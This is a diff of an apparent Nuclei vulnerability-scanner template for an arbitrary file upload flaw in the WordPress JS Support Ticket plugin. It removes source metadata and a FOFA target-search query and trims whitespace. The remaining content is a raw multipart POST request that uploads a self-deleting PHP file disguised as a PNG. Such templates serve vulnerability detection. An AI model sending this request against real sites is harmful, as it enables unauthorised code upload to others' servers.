@@ -3,12 +3,8 @@ info:
   name: Wordpress saveconfiguration 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/npog0hxmx95761g0'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: npog0hxmx95761g0
-    fofa: body="wp-content/plugins/js-support-ticket"
 http:
 - raw:
   - 'POST /wp-admin/?page=configuration&task=saveconfiguration HTTP/1.1
@@ -17,14 +13,10 @@ http:
     Content-Type: multipart/form-data; boundary=--------uhdbghjin
 
 
-
-
     ----------uhdbghjin
 
 
     Content-Disposition: form-data; name="action"
-
-
 
 
     configuration_saveconfiguration
@@ -34,8 +26,6 @@ http:
 
 
     Content-Disposition: form-data; name="form_request"
-
-
 
 
     jssupportticket
@@ -48,8 +38,6 @@ http:
 
 
     Content-Type: image/png
-
-
 
 
     <?php echo "dudesuite";unlink(__FILE__);?>
